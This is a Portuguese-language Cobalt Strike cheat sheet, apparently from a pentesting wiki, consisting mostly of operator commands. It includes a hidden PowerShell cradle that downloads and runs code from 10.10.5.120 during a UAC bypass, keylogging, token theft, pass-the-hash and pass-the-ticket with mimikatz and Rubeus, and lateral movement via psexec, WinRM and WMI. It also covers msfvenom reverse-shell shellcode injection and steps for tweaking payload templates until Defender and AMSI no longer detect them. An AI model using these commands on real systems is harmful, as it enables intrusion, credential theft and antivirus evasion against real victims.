# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, que tipo de beacon usar (http, dns, smb...) e mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam se comunicar diretamente com o C2, eles podem se comunicar através de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` então você precisa selecionar os beacons TCP ou SMB

* O **beacon TCP irá configurar um listener na porta selecionada**. Para conectar a um beacon TCP use o comando `connect <ip> <port>` de outro beacon
* O **beacon smb irá escutar em um pipename com o nome selecionado**. Para conectar a um beacon SMB você precisa usar o comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do office com uma macro
* **`Windows Executable`** para um .exe, .dll ou serviço .exe
* **`Windows Executable (S)`** para um **stageless** .exe, .dll ou serviço .exe (melhor stageless do que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso irá gerar um script/executável para baixar o beacon do cobalt strike em formatos como: bitsadmin, exe, powershell e python

#### Host Payloads

Se você já tem o arquivo que deseja hospedar em um servidor web, basta ir para `Attacks -> Web Drive-by -> Host File` e selecionar o arquivo para hospedar e a configuração do servidor web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>

# Screenshots
printscreen    # Tire uma única captura de tela via método PrintScr
screenshot     # Tire uma única captura de tela
screenwatch    # Tire capturas de tela periódicas da área de trabalho
## Vá para View -> Screenshots para vê-las

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes para ver as teclas pressionadas

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injete a ação de portscan dentro de outro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importar módulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell <apenas escreva o cmd do powershell aqui>

# User impersonation
## Geração de token com credenciais
make_token [DOMAIN\user] [password] #Crie um token para se passar por um usuário na rede
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token gerado com make_token
## O uso de make_token gera o evento 4624: Uma conta foi logada com sucesso. Este evento é muito comum em um domínio Windows, mas pode ser restringido filtrando pelo Tipo de Logon. Como mencionado acima, ele usa LOGON32_LOGON_NEW_CREDENTIALS que é do tipo 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Roubar token de pid
## Como make_token, mas roubando o token de um processo
steal_token [pid] # Além disso, isso é útil para ações de rede, não ações locais
## Da documentação da API sabemos que este tipo de logon "permite que o chamador clone seu token atual". É por isso que a saída do Beacon diz Impersonated <current_username> - está se passando pelo nosso próprio token clonado.
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token de steal_token

## Lançar processo com novas credenciais
spawnas [domain\username] [password] [listener] #Faça isso a partir de um diretório com acesso de leitura como: cd C:\
## Como make_token, isso gerará o evento Windows 4624: Uma conta foi logada com sucesso, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Detalhará o usuário chamador (TargetUserName) e o usuário impersonado (TargetOutboundUserName).

## Injete em processo
inject [pid] [x64|x86] [listener]
## Do ponto de vista de OpSec: Não realize injeção entre plataformas a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).

## Pass the hash
## Este processo de modificação requer patching da memória do LSASS, o que é uma ação de alto risco, requer privilégios de administrador local e não é muito viável se o Protected Process Light (PPL) estiver habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash através do mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sem /run, o mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para prosseguir)
steal_token <pid> #Roubar token de processo criado pelo mimikatz

## Pass the ticket
## Solicitar um ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Crie uma nova sessão de logon para usar com o novo ticket (para não sobrescrever o comprometido)
make_token <domain>\<username> DummyPass
## Escreva o ticket na máquina do atacante a partir de uma sessão do poweshell & carregue-o
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket do SYSTEM
## Gere um novo processo com o ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Roube o token daquele processo
steal_token <pid>

## Extrair ticket + Pass the ticket
### Listar tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Crie uma nova sessão de logon, anote luid e processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insira o ticket na sessão de logon gerada
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finalmente, roube o token daquele novo processo
steal_token <pid>

# Lateral Movement
## Se um token foi criado, ele será usado
jump [method] [target] [listener]
## Métodos:
## psexec                    x86   Use um serviço para executar um artefato Service EXE
## psexec64                  x64   Use um serviço para executar um artefato Service EXE
## psexec_psh                x86   Use um serviço para executar uma linha única do PowerShell
## winrm                     x86   Execute um script do PowerShell via WinRM
## winrm64                   x64   Execute um script do PowerShell via WinRM

remote-exec [method] [target] [command]
## Métodos:
<strong>## psexec                          Execução remota via Service Control Manager
</strong>## winrm                           Execução remota via WinRM (PowerShell)
## wmi                             Execução remota via WMI

## Para executar um beacon com wmi (não está no comando jump) basta fazer upload do beacon e executá-lo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## No host do metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## No cobalt: Listeners > Add e defina o Payload para Foreign HTTP. Defina o Host para 10.10.5.120, a Porta para 8080 e clique em Salvar.
beacon> spawn metasploit
## Você só pode gerar sessões x86 Meterpreter com o listener estrangeiro.

# Pass session to Metasploit - Through shellcode injection
## No host do metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Execute msfvenom e prepare o listener multi/handler

## Copie o arquivo bin para o host do cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injete o shellcode do metasploit em um processo x64

# Pass metasploit session to cobalt strike
## Gere shellcode Beacon stageless, vá para Attacks > Packages > Windows Executable (S), selecione o listener desejado, selecione Raw como o tipo de saída e selecione Use x64 payload.
## Use post/windows/manage/shellcode_inject no metasploit para injetar o shellcode gerado do cobalt strike


# Pivoting
## Abra um proxy socks no teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Avoiding AVs

### Artifact Kit

Geralmente em `/opt/cobaltstrike/artifact-kit` você pode encontrar o código e templates pré-compilados (em `/src-common`) dos payloads que o cobalt strike irá usar para gerar os beacons binários.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com o backdoor gerado (ou apenas com o template compilado) você pode descobrir o que está fazendo o defender disparar. Geralmente é uma string. Portanto, você pode apenas modificar o código que está gerando o backdoor para que essa string não apareça no binário final.

Após modificar o código, basta executar `./build.sh` a partir do mesmo diretório e copiar a pasta `dist-pipe/` para o cliente Windows em `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Não se esqueça de carregar o script agressivo `dist-pipe\artifact.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos e não os que estão carregados.

### Kit de Recursos

A pasta ResourceKit contém os modelos para os payloads baseados em script do Cobalt Strike, incluindo PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) com os modelos, você pode descobrir o que o defensor (AMSI neste caso) não gosta e modificá-lo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando as linhas detectadas, pode-se gerar um template que não será pego.

Não se esqueça de carregar o script agressivo `ResourceKit\resources.cna` para indicar ao Cobalt Strike que use os recursos do disco que queremos e não os que foram carregados.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

